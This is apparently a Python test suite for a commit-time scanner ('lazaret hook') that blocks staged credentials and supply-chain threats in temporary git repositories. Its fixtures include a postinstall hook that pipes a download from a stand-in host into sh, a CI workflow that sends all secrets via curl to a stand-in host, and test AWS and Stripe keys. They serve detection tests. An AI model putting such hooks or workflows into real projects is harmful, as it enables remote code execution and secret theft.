"""`lazaret hook`: the commit-time gate (H-1, lazaret/scanner/hook.py).

The files being committed are scanned as a project scan would scan them, from
their staged content, and the commit fails on `--ci`'s security and
supply-chain conditions. Each test makes a git repository in a temporary
folder; the credentials are built from parts, so this file holds none, and
nothing is run but git.
"""
import contextlib
import io
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

from tests import _support
from lazaret import _cli
from lazaret.scanner import _native, core, hook

GIT = shutil.which("git")
AWS_KEY = "AKIA" + "Q3EGRSWJ" + "ZTB7XF2N"
HOOK_DOWNLOADS = '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "curl -s https://x.invalid/i | sh"}}\n'
WORKFLOW = ("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: echo \"${{ toJSON(secrets) }}\" | curl -d @- https://x.invalid/c\n")


def _remove_readonly(func, path, _exc):
    os.chmod(path, stat.S_IWRITE)               # (git's objects are read-only on Windows)
    func(path)


def rmtree(path):
    """shutil.rmtree, through git's read-only files (onexc since 3.12, onerror before)."""
    key = "onexc" if sys.version_info >= (3, 12) else "onerror"
    shutil.rmtree(path, **{key: _remove_readonly})


@unittest.skipUnless(GIT, "git is not installed")
@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class HookTests(unittest.TestCase):
    def setUp(self):
        self.dir = os.path.realpath(tempfile.mkdtemp(prefix="lz-hook-"))
        self.addCleanup(rmtree, self.dir)
        self.git("init", "-q")
        self.git("config", "user.email", "t@x.invalid")
        self.git("config", "user.name", "t")
        self.git("config", "core.autocrlf", "false")

    def git(self, *args):
        return subprocess.run(["git", "-C", self.dir, *args], check=True, capture_output=True).stdout

    def write(self, rel, text):
        path = os.path.join(self.dir, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="\n") as f:
            f.write(text)

    def stage(self, rel, text):
        self.write(rel, text)
        self.git("--literal-pathspecs", "add", "-f", "--", rel)

    def check(self, *files, cwd=None):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = hook.run(list(files), cwd=cwd or self.dir)
        return code, out.getvalue()

    def test_a_staged_credential_fails_the_commit(self):
        self.stage("settings.py", f"AWS_ACCESS_KEY_ID = '{AWS_KEY}'\n")
        self.stage("util.py", "def add(a, b):\n    return a + b\n")
        code, out = self.check()
        self.assertEqual(code, 1, out)
        self.assertIn("lazaret hook: 2 files checked", out)
        self.assertIn("[S-TOKEN]", out)
        self.assertIn("Commit gate:", out)
        self.assertIn("No blocker issues", out)
        self.assertNotIn(AWS_KEY, out)                       # redacted, as in a project scan
        self.assertNotIn("Duplication", out)

    def test_the_staged_content_not_the_file_on_disk(self):
        self.stage("settings.py", f"KEY = '{AWS_KEY}'\n")
        self.write("settings.py", "KEY = None\n")              # cleaned on disk, not staged
        self.assertEqual(self.check()[0], 1)
        self.stage("settings.py", "KEY = None\n")
        self.write("settings.py", f"KEY = '{AWS_KEY}'\n")     # on disk only
        self.assertEqual(self.check()[0], 0)
        self.assertEqual(self.check("settings.py")[0], 0)      # a named file that git tracks: its staged content

    def test_after_the_first_commit_and_a_rename(self):
        self.stage("a.py", "x = 1\n")
        self.git("commit", "-q", "-m", "a")
        code, out = self.check()
        self.assertEqual((code, out.strip()), (0, "lazaret hook: nothing to check"))
        self.git("mv", "a.py", "b.py")
        self.stage("b.py", f"x = '{AWS_KEY}'\n")
        code, out = self.check()
        self.assertEqual(code, 1, out)
        self.assertIn("b.py", out)

    def test_supply_chain_threats_a_worm_commits(self):
        self.stage("package.json", HOOK_DOWNLOADS)
        self.stage(".github/workflows/ci.yml", WORKFLOW)
        code, out = self.check()
        self.assertEqual(code, 1, out)
        self.assertIn("[SC-INSTALL-HOOK]", out)
        self.assertIn("[SC-WORKFLOW-SECRETS]", out)
        self.assertIn("No supply-chain indicators", out)

    def test_a_config_file_and_a_path_with_spaces(self):
        self.stage("deploy keys/prod ü.env", "STRIPE_KEY=sk_live_" + "4eC39HqLyjWDarjtT1zdp7dc" + "\n")
        code, out = self.check()
        self.assertEqual(code, 1, out)
        self.assertIn("deploy keys/prod ü.env", out)

    def test_quality_is_not_the_gate(self):
        body = "".join(f"    v{i} = a + {i}\n    a = v{i} * 2\n" for i in range(60))
        self.stage("big.py", "def f(a):\n" + body + "    return a\n" + "def g(a):\n" + body + "    return a\n")
        self.stage("README.md", "# x\n")
        code, out = self.check()
        self.assertEqual(code, 0, out)
        self.assertIn("Commit gate:", out)
        scan = core.scan_project(self.dir)                    # (--ci fails it: 99% duplication)
        self.assertIn(("Duplication < 10%", False), [(c["label"], c["ok"]) for c in scan["conditions"]])

    def test_named_files_untracked_ones_read_from_disk(self):
        self.write("new.py", f"KEY = '{AWS_KEY}'\n")
        self.assertEqual(self.check("new.py")[0], 1)
        sub = os.path.join(self.dir, "sub")
        os.mkdir(sub)
        self.write("sub/x.py", "x = 1\n")
        self.assertEqual(self.check("x.py", cwd=sub)[0], 0)  # (relative to where it runs)

    @unittest.skipIf(sys.platform == "win32", "no symbolic links or FIFOs to make here")
    def test_links_are_not_followed_and_what_cant_be_read_fails(self):
        outside = os.path.join(tempfile.mkdtemp(prefix="lz-hook-out-"), "secret.py")
        self.addCleanup(shutil.rmtree, os.path.dirname(outside))
        with open(outside, "w", encoding="utf-8") as f:
            f.write(f"KEY = '{AWS_KEY}'\n")
        os.symlink(outside, os.path.join(self.dir, "link.py"))
        self.git("add", "link.py")
        self.assertEqual(self.check()[0], 0)
        self.assertEqual(self.check("link.py")[0], 0)           # named (as pre-commit may): still not followed
        fifo = os.path.join(self.dir, "pipe.py")
        os.mkfifo(fifo)
        code, out = self.check("pipe.py")
        self.assertEqual(code, 1, out)
        self.assertIn("[SC-TRUNCATED]", out)
        self.assertIn("it is not a regular file", out)

    def test_files_in_a_dependency_folder_are_read(self):
        # (the project scan leaves node_modules, a virtualenv and a vendor folder out unless --deps, so a key
        # committed in one went unchecked: H-2's review). They are read as a dependency's files are.
        self.stage("node_modules/x/settings.py", f"KEY = '{AWS_KEY}'\n")
        self.stage("vendor/package.json", '{"name": "y"}\n')
        self.stage("vendor/y/settings.py", f"KEY = '{AWS_KEY}'\n")
        code, out = self.check()
        self.assertEqual(code, 1, out)
        self.assertIn("lazaret hook: 3 files checked", out)
        for rel in ("node_modules/x/settings.py", "vendor/y/settings.py"):
            self.assertIn(f"  {rel}\n    L1     BLOCKER  [S-TOKEN]", out)
        self.assertEqual(self.check("vendor/y/settings.py")[0], 1)        # (named, as pre-commit names them)

    @unittest.skipIf(sys.platform == "win32", "a file name can't hold a backslash here")
    def test_two_names_one_file_in_the_check(self):
        # A backslash ends a folder's name in the temporary tree, as on Windows: `a\b.py` was written over `a/b.py`,
        # whose key then went unread (H-2's review). The second is SC-TRUNCATED now, and the first is read.
        self.stage("a/b.py", f"KEY = '{AWS_KEY}'\n")
        self.stage("a\\b.py", "KEY = None\n")
        code, out = self.check()
        self.assertEqual(code, 1, out)
        self.assertIn("  a/b.py\n    L1     BLOCKER  [S-TOKEN]", out)
        self.assertIn("  a\\b.py\n    L1     CRITICAL [SC-TRUNCATED] File not fully scanned: " + hook.COLLISION_WHY, out)

    def test_names_that_differ_only_in_case(self):
        # On macOS and Windows `A.py` and `a.py` are one file: the second was written over the first. Put in the
        # index as git would hold them from another system (the work tree can't hold both here either).
        self.git("config", "core.ignorecase", "false")       # (git takes both names into the index then)
        blob = lambda text: self.git_in(text, "hash-object", "-w", "--stdin").decode("ascii").strip()
        for rel, text in (("A.py", f"KEY = '{AWS_KEY}'\n"), ("a.py", "KEY = None\n")):
            self.git("update-index", "--add", "--cacheinfo", f"100644,{blob(text)},{rel}")
        code, out = self.check()
        self.assertEqual(code, 1, out)
        self.assertIn("  A.py\n    L1     BLOCKER  [S-TOKEN]", out)
        probe = tempfile.mkdtemp(prefix="lz-hook-case-")
        self.addCleanup(shutil.rmtree, probe)
        open(os.path.join(probe, "X"), "wb").close()
        if os.path.exists(os.path.join(probe, "x")):        # (a system whose names ignore case)
            self.assertIn(hook.COLLISION_WHY, out)

    def git_in(self, data, *args):
        return subprocess.run(["git", "-C", self.dir, *args], input=data.encode("utf-8"), check=True,
                              capture_output=True).stdout

    def test_an_index_entry_that_is_not_a_blob(self):
        # git prints a tree's bytes after its line: they are skipped, not read as the next file's line.
        self.stage("d/a.py", "x = 1\n")
        tree = self.git("write-tree").decode("ascii").strip()
        sub = self.git("rev-parse", f"{tree}:d").decode("ascii").strip()
        self.git("update-index", "--add", "--cacheinfo", f"100644,{sub},x.py")
        self.stage("y.py", f"KEY = '{AWS_KEY}'\n")
        code, out = self.check()
        self.assertEqual(code, 1, out)
        self.assertIn("  x.py\n    L1     CRITICAL [SC-TRUNCATED] File not fully scanned: " + hook.UNPRINTED_WHY, out)
        self.assertIn("  y.py\n    L1     BLOCKER  [S-TOKEN]", out)

    @unittest.skipIf(sys.platform == "win32", "the stand-in git is a shell script")
    def test_git_stopping_early_leaves_no_file_unchecked(self):
        # A git that prints the first blob and stops: each file after it is SC-TRUNCATED. The ones after the first
        # it failed on were neither written nor reported (H-2's review).
        for name in ("a.py", "b.py", "c.py"):
            self.stage(name, "x = 1\n")
        bindir = tempfile.mkdtemp(prefix="lz-hook-bin-")
        self.addCleanup(shutil.rmtree, bindir)
        fake = os.path.join(bindir, "git")
        with open(fake, "w", encoding="utf-8") as f:
            f.write(f'#!/bin/sh\ncase " $* " in\n  *" cat-file "*) head -n 1 | "{GIT}" "$@"; exit 0 ;;\nesac\n'
                    f'exec "{GIT}" "$@"\n')
        os.chmod(fake, 0o755)
        with mock.patch.object(hook.programs, "find", lambda name, path=None: fake if name == "git" else None):
            code, out = self.check()
        self.assertEqual(code, 1, out)
        self.assertNotIn("  a.py", out)
        for name in ("b.py", "c.py"):
            self.assertIn(f"  {name}\n    L1     CRITICAL [SC-TRUNCATED] File not fully scanned: {hook.UNPRINTED_WHY}", out)

    def test_usage_errors(self):
        os.mkdir(os.path.join(self.dir, "folder"))
        for files, message in ((["folder"], "is a folder"), (["gone.py"], "does not exist"),
                               ([os.path.join(os.pardir, "x.py")], "is outside the repository")):
            with self.subTest(files=files), self.assertRaises(hook.HookError) as ctx:
                self.check(*files)
            self.assertIn(message, str(ctx.exception))
        outside = tempfile.mkdtemp(prefix="lz-hook-norepo-")
        self.addCleanup(shutil.rmtree, outside)
        if hook.repo_root(outside) is None:                   # (a temporary folder inside a repository: skip)
            with self.assertRaises(hook.HookError) as ctx:
                self.check(cwd=outside)
            self.assertIn("not in a git repository", str(ctx.exception))
            with open(os.path.join(outside, "a.py"), "w", encoding="utf-8") as f:
                f.write(f"KEY = '{AWS_KEY}'\n")
            self.assertEqual(self.check("a.py", cwd=outside)[0], 1)

    def test_the_command_line(self):
        self.stage("settings.py", f"KEY = '{AWS_KEY}'\n")
        env = dict(os.environ, PYTHONPATH=_support.SRC + os.pathsep + os.environ.get("PYTHONPATH", ""))
        run = lambda *argv: subprocess.run([sys.executable, _support.CLI, *argv], cwd=self.dir, env=env,
                                           capture_output=True, text=True, encoding="utf-8")
        done = run("hook")
        self.assertEqual(done.returncode, 1, done.stdout + done.stderr)
        self.assertIn("[S-TOKEN]", done.stdout)
        done = run("hook", "--staged", "-q")
        self.assertEqual(done.returncode, 1, done.stderr)
        done = run("hook", "--staged", "settings.py")
        self.assertEqual(done.returncode, 2)
        self.assertIn("--staged checks the staged files", done.stderr)


class DispatchTests(unittest.TestCase):
    def test_the_lazaret_command_dispatches_hook(self):
        self.assertFalse(_cli.is_hook(["."]))
        self.assertFalse(_cli.is_hook(["hooks"]))
        cwd = os.getcwd()
        with tempfile.TemporaryDirectory() as d:
            os.chdir(d)
            try:
                self.assertTrue(_cli.is_hook(["hook"]))
                self.assertTrue(_cli.is_hook(["hook", "a.py"]))
                os.mkdir("hook")
                with open("a.py", "w", encoding="utf-8") as f:
                    f.write("x = 1\n")
                self.assertFalse(_cli.is_hook(["hook"]))                   # scan the folder named hook
                self.assertFalse(_cli.is_hook(["hook", "--ci"]))
                self.assertTrue(_cli.is_hook(["hook", "a.py"]))            # pre-commit's call
                self.assertTrue(_cli.is_hook(["hook", "--staged"]))
            finally:
                os.chdir(cwd)


if __name__ == "__main__":
    unittest.main()
